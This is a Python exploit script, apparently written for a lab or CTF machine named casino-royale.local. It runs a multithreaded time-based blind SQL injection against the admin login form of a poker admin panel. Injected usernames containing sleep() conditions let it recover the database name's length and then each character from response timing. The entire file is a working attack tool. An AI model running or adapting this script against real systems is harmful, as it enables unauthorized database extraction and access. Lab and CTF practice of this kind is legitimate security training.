from pwn import *
import requests, signal, pdb, sys, time, string
import concurrent.futures
import threading

lock = threading.Lock()

num_workers = 5

target_url = "http://casino-royale.local/pokeradmin/"
target_discover = "database()"


def sigint_handler():
    print("Exiting...")

signal.signal(signal.SIGINT, sigint_handler)
sleep_time = 0.05
characters = string.ascii_lowercase + "-_"

payload = "admin' and if(substring({0}".format(target_discover) + ",{0},1)='{1}', sleep("+"{0}),1)-- -".format(sleep_time) # .format(pos, char)

p_length = log.progress("Getting string length")



def discover_length():
    for l in range(0, 255):
        start_time = time.time()

        post_data = {
            'op': 'adminlogin',
            'username': "' or (1=1 and if(CHAR_LENGTH(DATABASE())={0}, sleep({1}),1)) -- - ".format(l, sleep_time),
            'password': 'test'

        }

        r = requests.post(target_url, data=post_data)

        end_time = time.time()

        execution_time = end_time - start_time
        if execution_time > sleep_time:
            return l

target_discover_length = discover_length()
p_length.success(str(target_discover_length))

p2 = log.progress("Discovering [{0}]".format(target_discover))

p2.status("Discovering [{0}] ({1} chars)".format(target_discover, str(target_discover_length)))

result = "_" * target_discover_length



def discover_char(pos):
    global result
    global p2
    for c in characters:
        start_time = time.time()

        post_data = {
            'op': 'adminlogin',
            'username': payload.format(pos, c),
            'password': 'test'

        }

        r = requests.post(target_url, data=post_data)

        end_time = time.time()

        execution_time = end_time - start_time
        if execution_time > sleep_time:
            result = result[:pos-1] + c + result[pos:]
            p2.status(result)
            return c,pos

def inject():
    p1 = log.progress("Brute force")
    p1.status("Starting bruteforce...")

##########
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
    # Use list comprehension to submit tasks to the executor
        results = [executor.submit(discover_char, i) for i in range(target_discover_length + 1)]

        # Use as_completed to iterate through the results as they are completed
        for future in concurrent.futures.as_completed(results):
            res = future.result()
##########


#    for i in range(0, result.length() + 1):
 #       discover_char(result, i)
  #      p2.status(result)

if __name__ == '__main__':
    inject()
